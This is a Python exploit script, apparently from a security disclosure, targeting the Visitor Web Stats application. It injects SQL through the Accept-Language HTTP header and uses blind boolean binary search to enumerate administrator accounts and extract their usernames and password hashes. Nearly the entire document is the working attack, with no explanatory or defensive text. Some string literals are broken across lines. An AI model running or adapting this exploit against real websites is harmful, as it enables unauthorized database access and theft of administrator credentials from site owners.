import sys
import http.client

if len(sys.argv) < 2:
        print("usage: " + sys.argv[0] + " <host> [<path>]")
        sys.exit();

host = sys.argv[1]
if len(sys.argv) > 2:
        path = sys.argv[2]
else:
        path = "/"

def req(lang):
        c = http.client.HTTPConnection(host)
        c.request('GET', path, '', {'Accept-Language': lang})
        return c.getresponse().read();

def check(condition):
        r = req("' AND 1=0 UNION SELECT id FROM administrators " + condition
        + " -- '")
        if r.find(b'update') != -1:
                return 1;
        elif r.find(b'Unknown column') != -1:
                print('Unknown database structure (no rc version?)')
                sys.exit();
        return 0;

if req("'").find(b'select counter FROM visitors where browser_ip') == -1:
        print('Target does not seem to have (a vulnarable version of)
        Visitor Web Stats or doesn\'t output any error messages')
        sys.exit();

admin_count = 1
while not check("HAVING COUNT(*) = " + str(admin_count)):
        admin_count += 1;
print("Number of admins: " + str(admin_count))

pw_chars = [x for x in range(48, 58)]
pw_chars.extend([x for x in range(97, 103)])
pw_chars.sort()

todo = [('', 0, 255)]
while len(todo):
        (found, start, end) = todo.pop()
        if start == 0 and end == 255 and check("WHERE user_name = '" + found
        + "'"):
                sys.stdout.write(found + " ")
                sys.stdout.flush()
                for i in range(35):
                        if i == 32:
                                sys.stdout.write(":")
                                sys.stdout.flush()
                                continue
                        pw_start, pw_end = 0, len(pw_chars) - 1
                        while pw_start != pw_end:
                                pw_mid = int((pw_start + pw_end) / 2)
                                if check("WHERE user_name = '" + found + "'
                                AND ORD(SUBSTRING(user_password, " + str(i + 1) + ", 1)) <= " +
str(pw_chars[pw_mid])):
                                        pw_end = pw_mid
                                else:
                                        if pw_mid == pw_end - 1:
                                                pw_start = pw_end
                                        else:
                                                pw_start = pw_mid
                        sys.stdout.write(chr(pw_chars[pw_start]))
                        sys.stdout.flush()
                print()
                if not check("WHERE SUBSTRING(user_name, 1, " +
                str(len(found)) + ") = '" + found + "' AND SUBSTRING(user_name, " +
str(len(found) + 1) + ", 1) > 0"):
                        continue;
        mid = int((start + end) / 2)
        if check("WHERE SUBSTRING(user_name, 1, " + str(len(found)) + ") =
        '" + found + "' AND ORD(SUBSTRING(user_name, " + str(len(found) + 1) + ",
1)) <= " + str(mid) + " AND ORD(SUBSTRING(user_name, " + str(len(found) + 1)
+ ", 1)) > 0"):
                if mid == start + 1:
                        todo.append((found + chr(mid), 0, 255))
                else:
                        todo.append((found, start, mid))
        if check("WHERE SUBSTRING(user_name, 1, " + str(len(found)) + ") =
        '" + found + "' AND ORD(SUBSTRING(user_name, " + str(len(found) + 1) + ",
1)) > " + str(mid)):
                if mid == end - 1:
                        todo.append((found + chr(end), 0, 255))
                else:
                        todo.append((found, mid, end))
